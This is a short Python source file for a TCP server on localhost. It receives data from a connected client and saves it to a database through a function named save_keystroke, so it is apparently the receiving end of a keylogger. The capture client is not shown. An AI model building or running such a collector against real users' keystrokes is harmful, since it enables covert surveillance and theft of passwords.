import socket
from Database import connect_db, create_table, save_keystroke, close_db
#Set up the server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_ip = '127.0.0.1'  # Localhost (adjust if necessary)
server_port = 12345
server_socket.bind((server_ip, server_port))
server_socket.listen(1)
print(f"Server listening on {server_ip}:{server_port}")

#Connect to  database
conn = connect_db()
create_table(conn)  # Ensure the table exists

#Accept connections and process incoming data
while True:
    client_socket, client_address = server_socket.accept()
    print(f"Connection established with {client_address}")

    while True:
        data = client_socket.recv(1024).decode('utf-8')  # Receive data from client
        if not data:
            break  #Exit loop if no data /client disconnected
        print(f"Received from client: {data}")
        save_keystroke(conn, data)  # Save the received data into the database
    client_socket.close()  # Close connection with client

close_db(conn) #Close the database connection when server shuts down
